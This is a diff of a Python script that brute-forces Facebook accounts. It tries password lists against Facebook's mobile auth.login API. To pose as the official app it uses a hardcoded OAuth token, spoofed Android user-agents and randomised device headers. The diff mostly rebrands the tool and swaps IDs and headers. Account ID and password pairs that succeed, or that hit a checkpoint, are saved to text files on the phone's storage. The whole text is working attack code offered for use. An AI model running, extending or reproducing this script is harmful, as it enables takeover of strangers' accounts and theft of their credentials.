@@ -1,8 +1,6 @@
-
 from os import path
 import os,base64,zlib,pip,urllib
 print('\n\033[1;37m install modules...\n It will take some seconds...')
-
 try:
         import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
@@ -433,7 +431,7 @@ def api(ids,names,passlist):
 def apix(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [RAHUL-RB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [SPY1x1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -445,7 +443,7 @@ def apix(ids,passlist):
                                 ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
-                                data = {"adid": "eb2ccb51-2a02-48b3-af3f-112cb29bcb52",
+                                data = {"adid": "9e0f3002-43fc-4358-89f1-5622b403d502",
                                         'email':ids,
                                         'password':pas,
                                         'cpl':'true',
@@ -458,19 +456,19 @@ def apix(ids,passlist):
                                         'generate_machine_id':'1',
                                         "locale":"es_CU","client_country_code":"CU",
                                         'device':gtt,
-                                        "device_id":"848eb76f-643b-45b8-883b-2c436d5930f2",
+                                        "device_id":"6e18861e-d578-4cfb-8728-528f1e4b90e7",
                                         "method":"auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(20000, 40000)),
-                                        'x-fb-connection-type':'mobile.CTRadioAccessTechnologyLTE',
+                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
+                                        'x-fb-connection-type':'unknown',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'User-Agent': 'Davik/2.1.0 (Linux; U; Android 12; V2031 Build/SP1A.210812.003) [FBAN/MessengerLite;FBAV/306.0.0.8.76;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/756869315;FBCR/Namaste;FBMF/vivo;FBBD/vivo;FBDV/V2031;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]',
-                                        'x-fb-net-hni':str(random.randint(20000, 40000)),
-                                        'x-fb-connection-bandwidth':str(random.randint(20000000, 30000000)),
-                                        'x-fb-connection-quality':'GOOD',
+                                        'User-Agent': 'Dalvik/2.1.0 Linux; U; Android 6.0.0; GT-I9300I Build/KTU84P) [FBAN/FB4A;FBAV/540.0.0.84.626;FBBV/169717250;FBDM/{density=4.0,width=1532,height=2560};FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/6.0.0;FBCA/armeabi-v7a:armeabi;]',
+                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
+                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+                                        'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
@@ -478,19 +476,19 @@ def apix(ids,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [RAHUL-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/RAHUL-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [SPY-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [SPY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/SPY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open(f'/sdcard/RAHUL-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/SPY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -498,7 +496,7 @@ def apix(ids,passlist):
                 except requests.exceptions.ConnectionError:
                         time.sleep(10)
                 except Exception as e:
-                        pass                        
+                        pass
 def pak():
                 user=[]
                 clear()
